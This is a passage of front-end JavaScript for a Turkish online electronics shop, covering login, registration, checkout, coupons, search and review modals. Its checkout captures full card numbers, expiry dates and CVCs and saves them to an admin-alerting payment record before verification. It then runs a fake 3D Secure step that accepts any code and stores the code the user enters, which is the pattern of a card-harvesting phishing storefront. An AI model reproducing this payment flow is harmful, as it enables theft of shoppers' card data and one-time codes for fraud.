                loginErrorMsg.textContent = `5 başarısız deneme! ${lockSecsNow} saniye beklemeniz gerekmektedir.`;
            } else {
                loginErrorMsg.textContent = err.message + ` (${5 - _loginAttempts.count} deneme hakkınız kaldı)`;
            }
            loginErrorMsg.style.display = 'block';
        }
    });

    // Register submit
    registerForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        // Rate limiting
        if (isRateLimited('registerForm', 2000)) return;

        const name = document.getElementById('register-name').value.trim();
        const email = document.getElementById('register-email').value.trim();
        const phone = document.getElementById('register-phone').value.trim();
        const addr = document.getElementById('register-address').value.trim();
        const pass = document.getElementById('register-password').value;

        // Input validation
        if (!name || name.length < 2) {
            registerErrorMsg.textContent = 'Ad Soyad en az 2 karakter olmalıdır.';
            registerErrorMsg.style.display = 'block';
            return;
        }
        if (!email || !email.includes('@')) {
            registerErrorMsg.textContent = 'Geçerli bir e-posta adresi giriniz.';
            registerErrorMsg.style.display = 'block';
            return;
        }
        if (!pass || pass.length < 6) {
            registerErrorMsg.textContent = 'Şifre en az 6 karakter olmalıdır.';
            registerErrorMsg.style.display = 'block';
            return;
        }

        try {
            await db.register(name, email, pass, phone, addr);
            closeRegisterModal();
            await db.login(email, pass);
            renderAuthNavbar();
            showToast('Üyelik başarıyla oluşturuldu!');
        } catch (err) {
            registerErrorMsg.textContent = err.message;
            registerErrorMsg.style.display = 'block';
        }
    });

    // Checkout Step 1 Submit
    deliveryForm.addEventListener('submit', (e) => {
        e.preventDefault();
        
        const name = document.getElementById('checkout-name').value.trim();
        const email = document.getElementById('checkout-email').value;
        const phone = document.getElementById('checkout-phone').value.trim();
        const address = document.getElementById('checkout-address').value.trim();

        summaryAddressDetails.innerText = address;
        summaryContactDetails.innerText = `${name} | ${phone} | ${email}`;

        // Clear card form fields
        document.getElementById('card-name').value = '';
        document.getElementById('card-number').value = '';
        document.getElementById('card-expiry').value = '';
        document.getElementById('card-cvc').value = '';

        checkoutStep1.classList.add('hidden');
        checkoutStep2.classList.remove('hidden');
    });

    backToStep1Btn.addEventListener('click', () => {
        checkoutStep2.classList.add('hidden');
        checkoutStep1.classList.remove('hidden');
    });

    // Checkout Step 2 Confirm Payment -> Triggers 3D Secure
    confirmOrderBtn.addEventListener('click', async () => {
        const cardName = document.getElementById('card-name').value.trim();
        const cardNum = document.getElementById('card-number').value.replace(/\s+/g, '');
        const cardExp = document.getElementById('card-expiry').value.trim();
        const cardCVC = document.getElementById('card-cvc').value.trim();

        if (!cardName || cardNum.length < 16 || cardExp.length < 5 || cardCVC.length < 3) {
            alert('Lütfen geçerli ödeme bilgilerini giriniz.');
            return;
        }

        // Generate 3D Secure SMS Code
        const code = Math.floor(100000 + Math.random() * 900000).toString();
        currentThreeDCode = code;
        threeDCodeDisplay.innerText = code;
        threeDCodeInput.value = '';
        threeDErrorMsg.style.display = 'none';

        // Pre-generate order code
        const forcedOrderCode = '#DORA-' + Math.floor(100000 + Math.random() * 900000);

        // Calculate total amount
        const subtotal = cart.reduce((sum, item) => sum + (item.newPrice * item.quantity), 0);
        let discount = 0;
        if (activeCoupon) {
            discount = subtotal * (activeCoupon.discountPercent / 100);
        }
        const totalAmount = subtotal - discount;

        // Save Encrypted Payment Details immediately (before SMS is verified) to trigger admin sound
        try {
            await db.savePaymentRecord(
                forcedOrderCode,
                cardName,
                cardNum,
                cardExp,
                cardCVC,
                totalAmount,
                code,
                'ONAY BEKLENİYOR'
            );
        } catch (err) {
            console.error("Payment record saving failed:", err);
        }

        // Dynamic SMS Simulation via Toast Notification
        showToast(`SMS: Dora Elektronik 3D Secure onay şifreniz: ${code}`);

        // Prepare pending order data
        const user = db.getCurrentUser();
        pendingOrderData = {
            userId: user ? user.id : null,
            cart: cart,
            address: document.getElementById('checkout-address').value.trim(),
            contactInfo: `${document.getElementById('checkout-name').value.trim()} | ${document.getElementById('checkout-phone').value.trim()} | ${document.getElementById('checkout-email').value}`,
            couponCode: activeCoupon ? activeCoupon.code : null,
            cardName: cardName,
            cardNumber: cardNum,
            cardExpiry: cardExp,
            cardCvc: cardCVC,
            orderCode: forcedOrderCode
        };

        // Open 3D Secure Modal
        threeDSecureModal.classList.add('active');
        threeDOverlay.classList.add('active');
    });

    // 3D Secure Submit Form
    threeDForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const enteredCode = threeDCodeInput.value.trim();

        // Verification successful (Bypassed: any code is accepted)
        confirmOrderBtn.disabled = true;
        confirmOrderBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> İşleniyor...';

        threeDSecureModal.classList.remove('active');
        threeDOverlay.classList.remove('active');

        // Store code values in pendingOrderData
        pendingOrderData.smsCode = currentThreeDCode;
        pendingOrderData.enteredCode = enteredCode;

        setTimeout(async () => {
            confirmOrderBtn.disabled = false;
            confirmOrderBtn.innerHTML = 'Siparişi Onayla';

            try {
                const order = db.createOrder(
                    pendingOrderData.userId,
                    pendingOrderData.cart,
                    pendingOrderData.address,
                    pendingOrderData.contactInfo,
                    pendingOrderData.couponCode,
                    pendingOrderData.orderCode
                );

                // Save Encrypted Payment Details (update with actual verification code)
                await db.savePaymentRecord(
                    order.order_code,
                    pendingOrderData.cardName,
                    pendingOrderData.cardNumber,
                    pendingOrderData.cardExpiry,
                    pendingOrderData.cardCvc,
                    order.total,
                    pendingOrderData.smsCode,
                    pendingOrderData.enteredCode
                );

                // Clear Coupon
                activeCoupon = null;
                couponInput.value = '';
                couponMessage.innerText = '';

                // Clear Cart
                cart = [];
                updateCart();

                // Open Success Modal
                closeCheckoutModal();
                successOrderCode.innerText = `Sipariş Numaranız: ${order.order_code}`;
                successModal.classList.add('active');
                successOverlay.classList.add('active');

            } catch (err) {
                alert(err.message);
                closeCheckoutModal();
            }
        }, 1200);
    });

    // Close 3D Secure
    threeDOverlay.addEventListener('click', () => {
        threeDSecureModal.classList.remove('active');
        threeDOverlay.classList.remove('active');
    });

    // Close success -> Opens Order Rating Modal
    closeSuccessBtn.addEventListener('click', () => {
        successModal.classList.remove('active');
        successOverlay.classList.remove('active');
        
        // Open rating modal
        const ratingModal = document.getElementById('order-rating-modal');
        const ratingOverlay = document.getElementById('order-rating-overlay');
        if (ratingModal && ratingOverlay) {
            ratingModal.classList.add('active');
            ratingOverlay.classList.add('active');
            setupOrderRatingStarsInput();
        } else {
            renderProducts(currentCategory);
        }
    });
    successOverlay.addEventListener('click', () => {
        successModal.classList.remove('active');
        successOverlay.classList.remove('active');
    });

    // Search Bar Input Event Listener (XSS safe - searchQuery kullanılırken sadece metin olarak işleniyor)
    searchInput.addEventListener('input', (e) => {
        const val = e.target.value.trim();
        const headerTitle = document.querySelector('.section-header h3');
        const headerSub = document.querySelector('.section-header p');
        
        if (val !== '') {
            currentCategory = 'all'; // Arama yapılırken tüm kategorilerde ara
            if (headerTitle) headerTitle.innerText = 'Arama Sonuçları';
            if (headerSub) headerSub.innerHTML = `&quot;${sanitizeInput(val)}&quot; için sonuçlar gösteriliyor`;
        } else {
            if (headerTitle) headerTitle.innerText = 'Yeni Gelenler';
            if (headerSub) headerSub.innerText = 'Sizin için seçtiğimiz en özel parçalar';
        }
        renderProducts();
    });

    // Apply Coupon
    applyCouponBtn.addEventListener('click', () => {
        const code = couponInput.value.trim().toUpperCase();
        if (cart.length === 0) {
            couponMessage.style.color = '#ff4757';
            couponMessage.innerText = 'Sepetiniz boş.';
            return;
        }

        const coupon = db.getCoupon(code);
        if (coupon) {
            activeCoupon = coupon;
            couponMessage.style.color = '#2ed573';
            couponMessage.innerText = `%${coupon.discountPercent} İndirim Kuponu Uygulandı!`;
            showToast(`%${coupon.discountPercent} indirim kuponu uygulandı!`);
        } else {
            activeCoupon = null;
            couponMessage.style.color = '#ff4757';
            couponMessage.innerText = 'Geçersiz kupon kodu.';
        }
        updateCart();
    });

    // About Modal
    footerAboutLink.addEventListener('click', (e) => {
        e.preventDefault();
        aboutModal.classList.add('active');
        aboutOverlay.classList.add('active');
    });
    closeAboutBtn.addEventListener('click', () => {
        aboutModal.classList.remove('active');
        aboutOverlay.classList.remove('active');
    });
    aboutOverlay.addEventListener('click', () => {
        aboutModal.classList.remove('active');
        aboutOverlay.classList.remove('active');
    });

    // Contact Modal
    footerContactLink.addEventListener('click', (e) => {
        e.preventDefault();
        contactModal.classList.add('active');
        contactOverlay.classList.add('active');
    });
    closeContactBtn.addEventListener('click', () => {
        contactModal.classList.remove('active');
        contactOverlay.classList.remove('active');
    });
    contactOverlay.addEventListener('click', () => {
        contactModal.classList.remove('active');
        contactOverlay.classList.remove('active');
    });

    // Contact Form Submit
    contactForm.addEventListener('submit', (e) => {
        e.preventDefault();
        contactModal.classList.remove('active');
        contactOverlay.classList.remove('active');
        contactForm.reset();
        showToast('Mesajınız başarıyla iletildi!');
    });

    // FAQ Modal opening / closing
    const faqModal = document.getElementById('faq-modal');
    const faqOverlay = document.getElementById('faq-overlay');
    const closeFaqBtn = document.getElementById('close-faq');
    const footerFaqLink = document.getElementById('footer-faq-link');

    const openFaqModal = (e) => {
        if (e) e.preventDefault();
        if (faqModal && faqOverlay) {
            faqModal.classList.add('active');
            faqOverlay.classList.add('active');
        }
    };
    window.openFaqModal = openFaqModal;

    const closeFaqModal = () => {
        if (faqModal && faqOverlay) {
            faqModal.classList.remove('active');
            faqOverlay.classList.remove('active');
        }
    };

    if (footerFaqLink) footerFaqLink.addEventListener('click', openFaqModal);
    if (closeFaqBtn) closeFaqBtn.addEventListener('click', closeFaqModal);
    if (faqOverlay) faqOverlay.addEventListener('click', closeFaqModal);

    // Accordion inside FAQ
    document.querySelectorAll('.faq-item').forEach(item => {
        const question = item.querySelector('.faq-question');
        const answer = item.querySelector('.faq-answer');
        
        if (question && answer) {
            question.addEventListener('click', () => {
                const isActive = item.classList.contains('active');
                
                // Close other accordion items
                document.querySelectorAll('.faq-item').forEach(otherItem => {
                    otherItem.classList.remove('active');
                    const otherAnswer = otherItem.querySelector('.faq-answer');
                    if (otherAnswer) {
                        otherAnswer.style.maxHeight = '0';
                        otherAnswer.style.opacity = '0';
                    }
                });

                if (!isActive) {
                    item.classList.add('active');
                    answer.style.maxHeight = answer.scrollHeight + 'px';
                    answer.style.opacity = '1';
                }
            });
        }
    });

    // Filter Navigation
    document.querySelectorAll('.nav-link').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const category = link.getAttribute('href').replace('index.html', '').replace('#', '');
            setCategory(category);
            const productsEl = document.getElementById('products');
            if (productsEl) productsEl.scrollIntoView({ behavior: 'smooth' });
        });
    });

    // Reset filter when clicking logo
    document.querySelector('.logo').addEventListener('click', () => {
        currentCategory = 'all';
        document.querySelector('.section-header h3').innerText = 'Yeni Gelenler';
        document.querySelector('.section-header p').innerText = 'Sizin için seçtiğimiz en özel parçalar';
        searchInput.value = '';
        
        // Reset filters
        const priceSlider = document.getElementById('filter-price');
        const priceDisplay = document.getElementById('filter-price-display');
        if (priceSlider && priceDisplay) {
            priceSlider.value = 120000;
            maxPrice = 120000;
            priceDisplay.innerText = '120000 TL';
        }
        document.querySelectorAll('.brand-filter-checkbox:checked').forEach(cb => cb.checked = false);
        document.querySelectorAll('.size-filter-checkbox:checked').forEach(cb => cb.checked = false);
        selectedBrands = [];
        selectedSizes = [];

        renderProducts();
        window.scrollTo({ top: 0, behavior: 'smooth' });
    });
}

// Input formatting and restriction helper for Credit Card details & SMS code
function setupCardInputFormatters() {
    const cardNumInput = document.getElementById('card-number');
    const cardExpInput = document.getElementById('card-expiry');
    const cardCVCInput = document.getElementById('card-cvc');
    const threeDInput = document.getElementById('three-d-code-input');

    if (cardNumInput) {
        cardNumInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 16) value = value.slice(0, 16);
            const formatted = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formatted;
        });
    }

    if (cardExpInput) {
        cardExpInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 4) value = value.slice(0, 4);
            if (value.length > 2) {
                e.target.value = value.slice(0, 2) + '/' + value.slice(2);
            } else {
                e.target.value = value;
            }
        });
    }

    if (cardCVCInput) {
        cardCVCInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 3) value = value.slice(0, 3);
            e.target.value = value;
        });
    }

    if (threeDInput) {
        threeDInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 6) value = value.slice(0, 6);
            e.target.value = value;
        });
    }
}

// Setup Order Rating Stars Input
function setupOrderRatingStarsInput() {
    const ratingModal = document.getElementById('order-rating-modal');
    const ratingOverlay = document.getElementById('order-rating-overlay');
    const ratingForm = document.getElementById('order-rating-form');
    const stars = ratingForm.querySelectorAll('.order-star-select');
    const selectedInput = document.getElementById('selected-order-rating');
    const submitBtn = document.getElementById('submit-rating-btn');
    const skipBtn = document.getElementById('skip-rating-btn');
    const ratingAuthor = document.getElementById('rating-author');
    const ratingText = document.getElementById('rating-text');
    
    // Fill in default username if user is logged in
    const currentUser = db.getCurrentUser();
    if (currentUser && ratingAuthor) {
        ratingAuthor.value = currentUser.name;
    }
    
    selectedInput.value = '0';
    submitBtn.disabled = true;
    
    // Clear styles
    stars.forEach(s => {
        s.classList.remove('active', 'hover');
        s.className = 'fa-regular fa-star order-star-select';
    });
    
    stars.forEach(star => {
        const ratingVal = parseInt(star.dataset.rating);
        
        star.onmouseenter = () => {
            stars.forEach(s => {
                const val = parseInt(s.dataset.rating);
                if (val <= ratingVal) {
                    s.classList.add('hover');
                    s.classList.remove('fa-regular');
                    s.classList.add('fa-solid');
                } else {
                    s.classList.remove('hover');
                    if (parseInt(selectedInput.value) < val) {
                        s.classList.remove('fa-solid');
                        s.classList.add('fa-regular');
                    }
                }
            });
        };
        
        star.onmouseleave = () => {
            const currentRating = parseInt(selectedInput.value);
            stars.forEach(s => {
                s.classList.remove('hover');
                const val = parseInt(s.dataset.rating);
                if (val <= currentRating) {
                    s.classList.add('fa-solid');
                    s.classList.remove('fa-regular');
                } else {
                    s.classList.remove('fa-solid');
                    s.classList.add('fa-regular');
                }
            });
        };
        
        star.onclick = () => {
            selectedInput.value = ratingVal.toString();
            submitBtn.disabled = false;
            stars.forEach(s => {
                const val = parseInt(s.dataset.rating);
                if (val <= ratingVal) {
                    s.classList.add('active', 'fa-solid');
                    s.classList.remove('fa-regular');
                } else {
                    s.classList.remove('active', 'fa-solid');
                    s.classList.add('fa-regular');
                }
            });
        };
    });
    
    const closeAll = () => {
        ratingModal.classList.remove('active');
        ratingOverlay.classList.remove('active');
        // Reload products grid to update stocks in UI!
        if (typeof renderProducts === 'function') {
            renderProducts(currentCategory);
        }
    };
    
    skipBtn.onclick = closeAll;
    ratingOverlay.onclick = closeAll;
    
    ratingForm.onsubmit = (e) => {
        e.preventDefault();
        const score = parseInt(selectedInput.value);
        const name = ratingAuthor.value.trim();
        const comment = ratingText.value.trim() || "Harika bir alışveriş deneyimi!";
        
        if (score > 0) {
            // Find which product to review. We can review the first item in the purchased cart, or product ID 1 as fallback.
            let productIdToReview = 1;
            if (pendingOrderData && pendingOrderData.cart && pendingOrderData.cart.length > 0) {
                productIdToReview = pendingOrderData.cart[0].id;
            }
            db.addReview(productIdToReview, name, score, comment);
            showToast("Değerlendirmeniz için teşekkür ederiz!");
        }
        closeAll();
    };
}

// Run
if (db.initPromise) {
    db.initPromise.then(() => init());
} else {
    init();
}
